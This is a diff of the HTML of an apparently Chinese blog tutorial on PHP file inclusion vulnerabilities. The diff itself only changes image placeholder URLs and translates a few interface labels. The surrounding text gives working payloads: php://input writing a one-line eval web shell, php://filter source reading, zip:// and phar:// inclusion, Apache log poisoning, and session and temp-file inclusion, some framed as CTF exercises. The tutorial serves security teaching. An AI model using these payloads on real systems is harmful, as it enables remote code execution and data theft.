@@ -137,7 +137,7 @@
 <li>include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上<br><br></li>
 </ul>
 <h2><span id="0x04-php伪协议">0x04  PHP伪协议</span></h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
-<h3><span id="一-phpinput">一、php://input</span></h3><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212171710961.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<h3><span id="一-phpinput">一、php://input</span></h3><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212171710961.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p><strong>Example 1：</strong> 造成任意代码执行</p>
 <pre><code class="php">&lt;meta charset=&quot;utf8&quot;&gt;
 &lt;?php
@@ -154,7 +154,7 @@ if($file){
 }
 ?&gt;
 </code></pre>
-<p><img src="/2019/02/13/文件包含漏洞总结/20190212171849262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212172017164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212185213880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
+<p><img src="/2019/02/13/文件包含漏洞总结/20190212171849262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212172017164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212185213880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
 <pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;
 </code></pre><p><strong>Example 2：</strong> 文件内容绕过</p>
 <pre><code class="php">//test.php
@@ -173,8 +173,8 @@ $flag = &#39;flag{flag_is_here}&#39;;
 ?&gt;
 </code></pre>
 <p>审计test.php知，当参数\$a不为空，且读取的文件中包含’I want flag’时，即可显示\$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。<br>注：遇到file_get_contents()要想到用php://input绕过。</p>
-<p><img src="/2019/02/13/文件包含漏洞总结/20190212173415247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
-<h3><span id="二-phpfilter">二、php://filter</span></h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。<br><img src="/2019/02/13/文件包含漏洞总结/20190212181216425.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212181226147.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
+<p><img src="/2019/02/13/文件包含漏洞总结/20190212173415247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<h3><span id="二-phpfilter">二、php://filter</span></h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。<br><img src="/2019/02/13/文件包含漏洞总结/20190212181216425.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212181226147.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
 <p>注：更多php://filter用法可参考：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
 <p><strong>Example 1：</strong></p>
 <pre><code class="php">&lt;meta charset=&quot;utf8&quot;&gt;
@@ -191,14 +191,14 @@ if($file){
 }
 ?&gt;
 </code></pre>
-<p>1.点击tip后进入如下页面，看到url中出现‘file=flag.php’，如下：<br><img src="/2019/02/13/文件包含漏洞总结/20190212181928339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>2.尝试payload：?php://filter/resource=flag.php，发现无法显示内容：<br><img src="/2019/02/13/文件包含漏洞总结/20190212182033920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>3.尝试payload：?php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</p>
-<p><img src="/2019/02/13/文件包含漏洞总结/20190212182541177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p>1.点击tip后进入如下页面，看到url中出现‘file=flag.php’，如下：<br><img src="/2019/02/13/文件包含漏洞总结/20190212181928339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>2.尝试payload：?php://filter/resource=flag.php，发现无法显示内容：<br><img src="/2019/02/13/文件包含漏洞总结/20190212182033920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>3.尝试payload：?php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</p>
+<p><img src="/2019/02/13/文件包含漏洞总结/20190212182541177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <h3><span id="三-zip">三、zip://</span></h3><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
 <ul>
 <li>zip://中只能传入绝对路径。</li>
 <li>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</li>
 <li>只需要是zip的压缩包即可，后缀名可以任意更改。</li>
-<li>相同的类型的还有zlib://和bzip2://<br><img src="/2019/02/13/文件包含漏洞总结/2019021218350876.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><strong>Example 1：</strong><pre><code class="php">//index.php
+<li>相同的类型的还有zlib://和bzip2://<br><img src="/2019/02/13/文件包含漏洞总结/2019021218350876.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><strong>Example 1：</strong><pre><code class="php">//index.php
 &lt;meta charset=&quot;utf8&quot;&gt;
 &lt;?php
 error_reporting(0);
@@ -244,10 +244,10 @@ if( isset( $_FILES[&#39;fupload&#39;] ) ) {
 </code></pre>
 </li>
 </ul>
-<h3><span id="四-data与phar">四、data://与phar://</span></h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212184105566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<h3><span id="四-data与phar">四、data://与phar://</span></h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212184105566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p>
 <ul>
-<li>phar://中相对路径和绝对路径都可以使用<br><img src="/2019/02/13/文件包含漏洞总结/20190212183933220.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><br><h2><span id="0x05-包含apache日志文件">0x05 包含Apache日志文件</span></h2>&emsp;&emsp;WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。<br><img src="/2019/02/13/文件包含漏洞总结/20190212212338582.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212212352893.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>&emsp;&emsp;Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>&emsp;&emsp;如果访问一个不存在的资源时，如<a href="http://www.xxxx.com/" target="_blank" rel="noopener">http://www.xxxx.com/</a>&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt;  写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全期间，安装apache时尽量不要使用默认路径。</li>
+<li>phar://中相对路径和绝对路径都可以使用<br><img src="/2019/02/13/文件包含漏洞总结/20190212183933220.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><br><h2><span id="0x05-包含apache日志文件">0x05 包含Apache日志文件</span></h2>&emsp;&emsp;WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。<br><img src="/2019/02/13/文件包含漏洞总结/20190212212338582.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212212352893.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>&emsp;&emsp;Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>&emsp;&emsp;如果访问一个不存在的资源时，如<a href="http://www.xxxx.com/" target="_blank" rel="noopener">http://www.xxxx.com/</a>&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt;  写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全期间，安装apache时尽量不要使用默认路径。</li>
 </ul>
 <p>参考文章：<a href="https://www.cnblogs.com/my1e3/p/5854897.html" target="_blank" rel="noopener">1.包含日志文件getshell</a><br>&emsp;&emsp;&emsp;&emsp;&emsp;<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" target="_blank" rel="noopener">2.一道包含日志文件的CTF题</a><br><br></p>
 <h2><span id="0x06-包含session">0x06 包含SESSION</span></h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
@@ -256,7 +256,7 @@ if( isset( $_FILES[&#39;fupload&#39;] ) ) {
 <li>找到Session内的可控变量</li>
 <li>Session文件可读写，并且知道存储路径</li>
 </ul>
-<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><strong>session常见存储路径：</strong></p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><strong>session常见存储路径：</strong></p>
 <ul>
 <li>/var/lib/php/sess_PHPSESSID</li>
 <li>/var/lib/php/sess_PHPSESSID</li>
@@ -272,7 +272,7 @@ if( isset( $_FILES[&#39;fupload&#39;] ) ) {
 <li>environ文件存储位置已知，且environ文件可读。</li>
 </ul>
 <p>参考文章：<a href="http://websecuritylog.blogspot.com/2010/06/procselfenviron-injection.html" target="_blank" rel="noopener">proc / self / environ Injection</a><br><br></p>
-<h2><span id="0x07-包含临时文件">0x07 包含临时文件</span></h2><p><img src="/2019/02/13/文件包含漏洞总结/1.jpg" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<h2><span id="0x07-包含临时文件">0x07 包含临时文件</span></h2><p><img src="/2019/02/13/文件包含漏洞总结/1.jpg" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
 <p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
 <p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="noopener">LFI With PHPInfo Assistance</a></p>
 <p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a><br><br></p>
@@ -373,11 +373,11 @@ copy  1.jpg/b+2.php  3.jpg
 <li>[访问参数]   <code>?file=http://localhost:8081/phpinfo.php?</code></li>
 <li>[拼接后] &emsp;<code>?file=http://localhost:8081/phpinfo.php?.txt</code></li>
 </ul>
-<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/2019021223193847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212231954243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><strong>fragment(#)</strong></p>
+<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/2019021223193847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212231954243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><strong>fragment(#)</strong></p>
 <ul>
 <li>[访问参数]   <code>?file=http://localhost:8081/phpinfo.php%23</code></li>
 <li><p>[拼接后]&emsp; <code>?file=http://localhost:8081/phpinfo.php#.txt</code></p>
-<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/20190212232732360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/2019021223280591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/20190212232732360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/2019021223280591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <h3><span id="二-利用协议">二、利用协议</span></h3><p>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</p>
 </li>
 </ul>
@@ -392,7 +392,7 @@ copy  1.jpg/b+2.php  3.jpg
 <li>[拼接后] &emsp;<code>?file=phar://zip.zip/phpinfo.txt</code></li>
 </ul>
 <p><strong>Example：</strong><br>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码&lt;?php phpinfo();?&gt;)）<br>所以分别构造payload为：</p>
-<p><code>?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234709548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><code>?file=phar://../../php.zip/phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234725870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><code>?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234709548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><code>?file=phar://../../php.zip/phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234725870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <h3><span id="三-长度截断">三、长度截断</span></h3><p><strong>利用条件：</strong> </p>
 <ul>
 <li>php版本 &lt; php 5.2.8</li>
@@ -461,7 +461,7 @@ copy  1.jpg/b+2.php  3.jpg
     <div class="d-none d-lg-block col-lg-2 toc-container">
       
   <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
     <div id="tocbot"></div>
   </div>
 
@@ -515,7 +515,7 @@ copy  1.jpg/b+2.php  3.jpg
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -523,7 +523,7 @@ copy  1.jpg/b+2.php  3.jpg
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
